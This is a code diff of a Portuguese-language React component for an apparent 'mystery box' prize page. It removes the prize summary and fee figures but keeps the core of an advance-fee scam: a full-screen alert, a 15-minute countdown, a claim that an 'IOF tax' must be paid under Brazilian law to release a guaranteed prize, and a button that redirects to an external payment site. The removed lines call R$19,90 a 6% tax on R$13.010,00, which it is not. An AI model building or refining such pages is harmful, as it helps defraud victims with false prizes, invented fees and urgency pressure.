@@ -3,14 +3,10 @@ import { AlertTriangle, ExternalLink, Clock, Shield, CheckCircle } from 'lucide-
 
 interface TaxPaymentScreenProps {
   customerName: string;
-  winningNumber: number;
-  prizeAmount: number;
 }
 
 const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
-  customerName,
-  winningNumber,
-  prizeAmount
+  customerName
 }) => {
   const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutos
   const [isRedirecting, setIsRedirecting] = useState(false);
@@ -52,17 +48,6 @@ const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
     return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
   };
 
-  const formatNumber = (num: number) => {
-    return num.toString().padStart(5, '0');
-  };
-
-  const formatCurrency = (value: number) => {
-    return value.toLocaleString('pt-BR', {
-      style: 'currency',
-      currency: 'BRL'
-    });
-  };
-
   const handlePayTax = () => {
     setIsRedirecting(true);
     
@@ -71,9 +56,6 @@ const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
       window.open('https://caixamisteriosa.online/iof', '_blank');
     }, 1500);
   };
-
-  const taxAmount = 1990; // R$ 19,90 em centavos
-  const netAmount = 1301000; // R$ 13.010,00 em centavos
 
   return (
     <div className="fixed inset-0 bg-gradient-to-br from-orange-600 via-red-600 to-pink-600 flex items-center justify-center z-50 p-4">
@@ -90,25 +72,6 @@ const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
           </p>
         </div>
 
-        {/* Resumo do Prêmio */}
-        <div className="bg-green-50 border-2 border-green-200 rounded-xl p-4 mb-6">
-          <div className="text-center">
-            <div className="flex items-center justify-center gap-2 mb-2">
-              <CheckCircle className="w-5 h-5 text-green-600" />
-              <span className="font-bold text-green-800">PRÊMIO GARANTIDO</span>
-            </div>
-            <div className="text-sm text-green-700 mb-2">
-              Número sorteado: <span className="font-mono font-bold">{formatNumber(winningNumber)}</span>
-            </div>
-            <div className="text-3xl font-black text-green-800">
-              {formatCurrency(prizeAmount)}
-            </div>
-            <div className="text-sm text-green-600 mt-1">
-              Pagamento via PIX em até 24h
-            </div>
-          </div>
-        </div>
-
         {/* Aviso de Taxa */}
         <div className="bg-orange-50 border-2 border-orange-300 rounded-xl p-4 mb-6">
           <div className="flex items-start gap-3">
@@ -120,17 +83,6 @@ const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
               <p className="text-sm text-orange-700 mb-3">
                 Para liberar seu prêmio, é necessário o pagamento da taxa de imposto IOF conforme legislação brasileira.
               </p>
-              
-              <div className="bg-white rounded-lg p-3 border border-orange-200">
-                <div className="flex justify-between items-center mb-2">
-                  <span className="text-sm text-gray-600">Taxa IOF (6%):</span>
-                  <span className="font-bold text-gray-800">{formatCurrency(taxAmount)}</span>
-                </div>
-                <div className="flex justify-between items-center">
-                  <span className="text-sm font-bold text-green-700">Valor líquido a receber:</span>
-                  <span className="font-bold text-green-700">{formatCurrency(netAmount)}</span>
-                </div>
-              </div>
             </div>
           </div>
         </div>
@@ -179,7 +131,7 @@ const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
           ) : (
             <>
               <ExternalLink className="w-5 h-5" />
-              PAGAR TAXA IOF - {formatCurrency(taxAmount)}
+              PAGAR TAXA IOF
             </>
           )}
         </button>
